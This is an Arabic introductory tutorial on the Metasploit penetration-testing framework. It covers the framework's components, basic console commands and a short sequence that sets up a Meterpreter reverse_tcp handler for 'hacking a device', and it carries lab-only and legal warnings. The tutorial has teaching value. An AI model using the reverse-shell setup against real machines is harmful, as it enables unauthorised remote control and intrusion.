Metasploit: الموسوعة الكاملة

1. ما هو Metasploit؟

Metasploit هو إطار عمل (Framework) مفتوح المصدر، يُستخدم لتطوير وتنفيذ هجمات الاختراق (Exploits) واختبار الثغرات الأمنية. يعتبر الأداة الأولى للقراصنة الأخلاقيين ومختبرين الأمن السيبراني.

2. أهم مكونات Metasploit

  • Exploits: الأكواد التي تستغل الثغرات الأمنية.
  • Payloads: الأكواد التي يتم تنفيذها بعد نجاح الاختراق (مثل Meterpreter).
  • Encoders: أدوات لتشفير الحمولات لتجنب اكتشافها.
  • Post Exploitation: أدوات للتحكم بالجهاز المخترق بعد الدخول.

3. أوامر أساسية في Metasploit

msfconsole

وصف: هذا الأمر يفتح واجهة الأوامر الرئيسية لـ Metasploit.

search [اسم_الثغرة]

وصف: يبحث في قاعدة بيانات Metasploit عن ثغرة معينة.

use [مسار_الاستغلال]

وصف: يختار استغلال (Exploit) معين للعمل عليه.

show options

وصف: يعرض الخيارات المتاحة للاستغلال الحالي.

exploit

وصف: ينفذ الهجوم ويحاول اختراق الهدف.

4. مثال عملي: اختراق جهاز

إليك تسلسل بسيط لاختراق جهاز على نفس الشبكة باستخدام Metasploit:

1. msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse_tcp
4. set LHOST [عنوان_IP_الخاص_بك]
5. set LPORT 4444
6. exploit

* هذا مثال تعليمي فقط. يجب استخدامه في بيئة معملية آمنة.

تنبيه أخلاقي

Metasploit هو أداة قوية جداً. استخدامها لاختراق أجهزة لا تملكها جريمة يعاقب عليها القانون.
